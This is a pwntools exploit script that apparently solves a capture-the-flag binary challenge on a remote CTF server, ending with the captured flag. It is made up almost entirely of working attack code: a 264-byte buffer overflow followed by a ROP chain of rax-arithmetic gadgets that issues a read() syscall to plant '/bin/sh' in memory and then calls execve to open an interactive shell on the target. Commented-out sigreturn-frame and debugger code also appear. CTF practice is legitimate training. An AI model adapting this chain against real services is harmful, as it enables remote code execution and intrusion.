from pwn import *
import time
elf = context.binary = ELF("./chall")
# r = process()
r = remote("ctf-chall.stembascc.com",5230)
# context.terminal = ['tmux', 'splitw', '-h']
offset = 264
xor_rax_rax_nop_pop_rbp = 0x0000000000401266
add_rax_13_nop_pop_rbp = 0x000000000040123c
add_rax_2_nop_pop_rbp = 0x000000000040121e
add_rax_8_nop_pop_rbp = 0x000000000040122d
add_rax_11_nop_pop_rbp = 0x00000000004011f3
mov_rbp_rsp_syscall_nop_pop_rbp = 0x0000000000401271
rop = ROP(context.binary)
rop.raw(b"A" * offset)
# Bersih bersih plus untuk set rax ke 0 untuk melakukan read() dan mengirim /bin/sh
wa_memory = 0x404050
rop.raw(xor_rax_rax_nop_pop_rbp)
rop.raw(0)
rop.rdi = 0
rop.rsi = wa_memory
rop.rdx = 0xff
rop.raw(mov_rbp_rsp_syscall_nop_pop_rbp)
rop.raw(0)
rop.raw(xor_rax_rax_nop_pop_rbp)
rop.raw(0)
rop.raw(add_rax_11_nop_pop_rbp)
rop.raw(0x0)
rop.raw(add_rax_13_nop_pop_rbp)
rop.raw(0x0)
rop.raw(add_rax_13_nop_pop_rbp)
rop.raw(0x0)
rop.raw(add_rax_8_nop_pop_rbp)
rop.raw(0x0)
rop.raw(add_rax_8_nop_pop_rbp)
rop.raw(0x0)
rop.raw(add_rax_2_nop_pop_rbp)
rop.raw(0x0)
rop.raw(add_rax_2_nop_pop_rbp)
rop.raw(0x0)
rop.raw(add_rax_2_nop_pop_rbp)
rop.raw(0x0)
rop.rdi = wa_memory
rop.rsi = 0
rop.rdx = 0
rop.raw(mov_rbp_rsp_syscall_nop_pop_rbp)
rop.raw(0)

# safe_region = 0x4010b0
# frame = SigreturnFrame()
# frame.rax = constants.SYS_read
# frame.rdi = 0
# frame.rsi = wa_memory
# frame.rdx = 0xff
# frame.rip = safe_region
# frame.rbp = 0x7fffffffde80
# rop.raw(frame)
# gdb.attach(r, '''
#         echo "hi"
#         break *0x4012e8
#         continue
#         ''')  # Use tmux
r.sendline(rop.chain())
r.send("/bin/sh\x00")
r.interactive()
write("payload",rop.chain())
print(rop.dump())

# Flag: PETIR{L1vyDun3_K4yCen4t_&_F4NumT4x3d_lmao_L}